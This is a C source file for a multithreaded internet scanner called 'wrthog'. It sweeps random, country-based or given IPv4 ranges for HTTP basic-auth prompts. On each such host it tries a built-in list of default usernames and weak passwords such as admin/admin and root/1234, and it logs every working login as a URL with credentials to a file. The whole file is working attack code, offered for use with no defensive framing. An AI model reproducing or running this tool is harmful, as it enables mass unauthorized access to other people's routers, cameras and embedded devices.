#include "wrthog.h"

static uint32_t startIP;
static uint32_t currIP;
static uint32_t endIP;    // inclusive - "through" the end IP
static uint32_t numIPs;
static uint32_t currPct;  // current percentage complete
static bool useRandom;
static pthread_mutex_t ipMutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t printMutex = PTHREAD_MUTEX_INITIALIZER;
static FILE *hosts;
static FILE *history;
static FILE *curlSink;

// const can only be "applied through" one level of indirection
static const char *const usernames[] = {"", "admin", "root", "user",
      "manager"};

static const char *const passwords[] = {"", "admin", "root", "pass",
      "password", "1234", "Password1", "0000", "friend", "*?"};

static FILE *downloadCSV(const char *url);
static char **readCSV(FILE *csvFile, size_t *numCSVLines);
static void selectIPBlock(char **csvLines, size_t numCSVLines);
static char *getCSVColumn(const char *line, size_t columnNum);
static void work(void *tid);
static inline uint32_t getIP(unsigned int *randState);
static long curl(const char *ip, const char *username, const char *password,
                 char **basicRealm);
static size_t parseHeader(void *ptr, size_t size, size_t nmemb, void *userdata);
static uint32_t atoh(const char *ipStr);
static void htoa(uint32_t ip, char *buf);
static void threadMsg(const char *msg);
static void die(const char *msg);
static void parseArgs(args_t *args, const char *argv[]);


int main(int argc, const char *argv[]) {
  //if (argc != 3) die("usage: wrthog <country code> <threads>");
  args_t args;
  parseArgs(&args, argv);

  size_t numCSVLines = 0;
  char **csvLines = NULL;

  srand(time(NULL));

  hosts = fopen("./hosts", "a");
  history = fopen("./history", "a");
  curlSink = fopen("/dev/null", "w");

  if (*args.startAddress) {
    currIP = atoh(args.startAddress);
    endIP = currIP + args.numAddresses;
  }
  else if (*args.countryCode) {

    char url[strlen(CSV_DIRECTORY) + strlen(args.countryCode) +
             strlen(CSV_EXTENSION) + 1];
    strcpy(url, CSV_DIRECTORY);
    strcat(url, args.countryCode);
    strcat(url, CSV_EXTENSION);

    FILE *csvFile = downloadCSV(url);

    csvLines = readCSV(csvFile, &numCSVLines);

    // populates currIP and endIP
    selectIPBlock(csvLines, numCSVLines); // check-already-scanned in here
  }
  else if (args.random) {
    useRandom = true;
  }

  if (*args.startAddress || *args.countryCode) {
    startIP = currIP;
    numIPs = endIP - startIP + 1;

    char ipStr[16];
    htoa(currIP, ipStr);
    //printf("Starting %s (%u)\n", ipStr, numIPs);
    printf("Starting %s (%u)\n", ipStr, endIP - currIP + 1);
  }

  pthread_t threads[args.numThreads];
  for (size_t i = 0; i < args.numThreads; ++i) {
    // no need to dereference a pointer - pass tid by value
    pthread_create(&threads[i], NULL, (void* (*)(void*))work, (void *)i);
  }
  for (size_t i = 0; i < args.numThreads; ++i) {
    pthread_join(threads[i], NULL);
  }

  if (*args.countryCode) {
    // cleanup
    for (int i = 0; i < numCSVLines; ++i) {
      free(csvLines[i]);
    }
    free(csvLines);
  }

  fclose(hosts);
  fclose(history);
  fclose(curlSink);

  printf("\ncomplete.\n");
  return 0;
}

/*
 * Returns a FILE * pointing to an IP block-containing CSV file, created as a
 * tmpfile.
 */
static FILE *downloadCSV(const char *url) {
  CURL *curl = curl_easy_init();
  if (!curl) die("cURL init() failed");

  curl_easy_setopt(curl, CURLOPT_URL, url);

  FILE *tmpFile = tmpfile();

  curl_easy_setopt(curl, CURLOPT_WRITEDATA, tmpFile);
  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, CSV_DOWNLOAD_TIMEOUT);
  CURLcode curlRes = curl_easy_perform(curl);
  if (curlRes != CURLE_OK) die("cURL perform() failed");

  long httpRes;
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpRes);
  if (httpRes == 404) die("invalid country code");
  else if (httpRes != 200) die("cURL received invalid HTTP response");

  curl_easy_cleanup(curl);

  rewind(tmpFile);
  return tmpFile;
}

/* Reads the supplied CSV file into an array, line-by-line. */
// TODO: final line may be blank.  account for this!
// ALSO: each CSV line is ended by \r\n, not just \n
static char **readCSV(FILE *csvFile, size_t *numCSVLines) {
  char **csvLines = NULL;
  char line[CSV_LINEBUF_SIZE];

  while (fgets(line, sizeof(line), csvFile)) {
    ++(*numCSVLines);
    csvLines = (char **)realloc(csvLines, sizeof(char *) * (*numCSVLines));
    csvLines[*numCSVLines - 1] = strdup(line);
  }

  fclose(csvFile);

  return csvLines;
}

/*
 * Sets global variables currIP and endIP in accord with the chosen IP address
 * range.
 */
static void selectIPBlock(char **csvLines, size_t numCSVLines) {
  // TODO - check if we've already scanned this block <recently>

  size_t index = rand() % numCSVLines;

  char *startIPStr = getCSVColumn(csvLines[index], 0);
  char *endIPStr = getCSVColumn(csvLines[index], 1);
  // don't need this... yet
  //char *numIPsInBlock = getCSVColumn(csvLines[index], 2);

  currIP = atoh(startIPStr);
  endIP = atoh(endIPStr);

  free(startIPStr);
  free(endIPStr);
}

/*
 * Returns a dynamically-allocated string representing the columnNum-th column
 * of char *line.
 */
static char *getCSVColumn(const char *line, size_t columnNum) {
  char _line[strlen(line) + 1];
  strcpy(_line, line);

  char *column = strtok(_line, ",");
  for (int i = 0; i < columnNum; ++i) {
    column = strtok(NULL, ",");
  }

  return strdup(column);
}

static uint32_t atoh(const char *ipStr) {
  union {
    uint8_t octets[4];
    uint32_t ip;
  } _ip;

  sscanf(ipStr, "%"SCNu8".%"SCNu8".%"SCNu8".%"SCNu8"",
         &_ip.octets[3], &_ip.octets[2], &_ip.octets[1], &_ip.octets[0]);
  return _ip.ip;
}

/* Returns an ASCII representation of the supplied uint32_t IP address, stored
 * in buf.  Note - the callee must ensure that the passed-in IPv4 ipStr
 * buffer is large enough; recommend 16 bytes.
 */
static void htoa(uint32_t ip, char *buf) {
  uint8_t *octets = (uint8_t *)&ip;

  sprintf(buf, "%"PRIu8".%"PRIu8".%"PRIu8".%"PRIu8"",
          octets[3], octets[2], octets[1], octets[0]);
}

/*
 * Worker thread.  Remember that void *tid serves as a pass-by-value integer
 * here. In the future, convert void *arg to port number, or rand/port # array?
 */
static void work(void *tid) {
  // sloppy, but it works.
  unsigned int randState = 0;

  // this may not belong here
  char ipStr[16];

  char *basicRealm = NULL;

  if (useRandom) {
    randState = time(NULL) + (size_t)tid;
  }

  outer: while (true) {
    uint32_t ip = (useRandom) ? getIP(&randState) : getIP(NULL);
    if (!ip) break;   // bug: could produce 0.0.0.0 and break before necessary

    htoa(ip, ipStr);
    //threadMsg(ipStr);
    long httpRes = curl(ipStr, NULL, NULL, NULL);

    if (httpRes) {
      pthread_mutex_lock(&printMutex);
      if (httpRes == 401) printf("%s\t[" ANSI_COLOR_GREEN "%li" ANSI_COLOR_RESET "]\n",
                                 ipStr, httpRes);
      else printf("%s\t[" ANSI_COLOR_YELLOW "%li" ANSI_COLOR_RESET "]\n",
                  ipStr, httpRes);
      pthread_mutex_unlock(&printMutex);
    }

    if (httpRes == 401) {
      for (int i = 0; i < (sizeof(usernames) / sizeof(usernames[0])); ++i) {
        for (int j = 0; j < (sizeof(passwords) / sizeof(passwords[0])); ++j) {
          httpRes = curl(ipStr, usernames[i], passwords[j], &basicRealm);

          if (httpRes == 200) {
            pthread_mutex_lock(&printMutex);
            printf(ANSI_COLOR_CYAN "\t\t%s [%s : %s] - %s\n" ANSI_COLOR_RESET,
                   ipStr, usernames[i], passwords[j], basicRealm);
            fprintf(hosts, "http://%s:%s@%s - %s\n", usernames[i], passwords[j],
                    ipStr, basicRealm);

             // buffer may not be flushed if wrthog receives SIGINT mid-scan
            fflush(hosts);
            pthread_mutex_unlock(&printMutex);
            goto outer;    // avoids duplicates
          }
        }
      }
    }

  }

  if (basicRealm) free(basicRealm);
}

static inline uint32_t getIP(unsigned int *randState) {
  union {
    uint8_t octets[4];
    uint32_t ip;
  } _ip;

  if (randState) {
    for (int i = 0; i < 4; ++i) {
      int32_t component = rand_r(randState);
      component %= 256;
      _ip.octets[i] = component; // doesn't matter what order in which we build
    }                            //  _ip; here, from least to most significant
  }
  else {
    pthread_mutex_lock(&ipMutex);

    /* Progress counter */
    uint32_t newCurrPct = (((currIP - startIP) * 100) / numIPs);
    if (currPct < newCurrPct) {
      printf("-- %u%% --\r", newCurrPct);
      fflush(stdout);   // needed, as we don't have \n, only \r
      currPct = newCurrPct;
    }
    /*                  */

    if (currIP > endIP) {     // this check must be protected
      pthread_mutex_unlock(&ipMutex);
      return 0;
    }
    _ip.ip = currIP;         // thread-local copy
    ++currIP;
    pthread_mutex_unlock(&ipMutex);
  }

  return _ip.ip;
}

// combine this with work()
static long curl(const char *ip, const char *username, const char *password,
                 char **basicRealm) {
  CURL *curl;
  CURLcode curl_res;

  curl = curl_easy_init();

  if (!curl) {
    threadMsg("couldn't initiate cURL");
    return 0;
  }

  curl_easy_setopt(curl, CURLOPT_URL, ip);
  curl_easy_setopt(curl, CURLOPT_HEADER, 1);
  //curl_easy_setopt(curl, CURLOPT_NOBODY, 1);  // cURL performs a HEAD request
  // never mind, some embedded http servers are too dumb to understand a HEAD request
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, curlSink);  // discard res data


  // prepare the callback to record the received header's "basic realm" field
  if (basicRealm) {
    curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, parseHeader);
    curl_easy_setopt(curl, CURLOPT_WRITEHEADER, basicRealm);
  }

  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);   // handle redirects
  curl_easy_setopt(curl, CURLOPT_MAXREDIRS, SCAN_MAX_REDIRS);
  curl_easy_setopt(curl, CURLOPT_TIMEOUT, SCAN_TIMEOUT);
  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, SCAN_TIMEOUT);
  // BUG NOTE - libcURL bug mentioned on StackOverflow
  if (LIBCURL_LEGACY) curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);

  if (username && password) {
    char authStr[strlen(username) + strlen(password) + 2];
    strcpy(authStr, username);
    strcat(authStr, ":");
    strcat(authStr, password);
    curl_easy_setopt(curl, CURLOPT_USERPWD, authStr);
  }

  curl_res = curl_easy_perform(curl);
  long http_res;
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_res);

  curl_easy_cleanup(curl);

  return (curl_res == CURLE_OK) ? http_res : 0;
}

static size_t parseHeader(void *ptr, size_t size, size_t nmemb, void *userdata) {
  char **basicRealm = (char **)userdata;

  // "do not assume the header line is zero-terminated!"
  char line[(nmemb * size) + 1];
  memcpy(line, ptr, (nmemb * size));  // needn't call strncpy
  line[sizeof(line) - 1] = '\0';

  // if we've been signaled to fill in the basic realm, and it's not already
  // filled in yet... (note that the first check is technically unnecesary,
  // since the parseHeader callback will only be installed if the client
  // receives a "parsable" 401 response).
  if (basicRealm && !(*basicRealm)) {
    char *realmStr;
    if ((realmStr = strstr(line, REALM_HEADER))) {
      realmStr += sizeof(REALM_HEADER) - 1;
      // we don't assume that this will fail...
      *strchr(realmStr, '"') = '\0';

      // better to put this on the heap than store it in a buffer
      *basicRealm = strdup(realmStr);
    }
  }

  return nmemb * size;
}

/* Simple thread-safe messaging function. */
// TODO - support more elaborate logging to file?
static void threadMsg(const char *msg) {
  pthread_mutex_lock(&printMutex);
  printf("%s\n", msg);
  pthread_mutex_unlock(&printMutex);
}

/* Arrivederci, Roma. */
static void die(const char *msg) {
  printf("%s\n", msg);
  exit(0);
}

/*
 * Fills out a struct with all parameters needed to run: random IP selection,
 * country to select IPs from (if applicable), number of addresses to scan,
 * and worker thread count (defaults to 256).
 */
static void parseArgs(args_t *args, const char *argv[]) {

  // establish defaults
  memset(args->startAddress, 0, sizeof(args->startAddress));
  args->numAddresses = 0;
  args->numThreads = 256;
  memset(args->countryCode, 0, sizeof(args->countryCode));
  args->random = false;

  ++argv;   // advance past executable name
  while (*argv) {
    // run modes
    if (!strcmp(*argv, "-r")) {
      args->random = true;
    }

    if (!*(argv + 1)) break;

    if (!strcmp(*argv, "-c")) {
      strncpy(args->countryCode, *(argv + 1), sizeof(args->countryCode) - 1);
    }
    if (!strcmp(*argv, "-a")) {
      strncpy(args->startAddress, *(argv + 1), sizeof(args->startAddress) - 1);
    }
    if (!strcmp(*argv, "-n")) {
      args->numAddresses = atoi(*(argv + 1));
    }

    if (!strcmp(*argv, "-t")) {
      args->numThreads = atoi(*(argv + 1));
    }

    ++argv;
  }
}
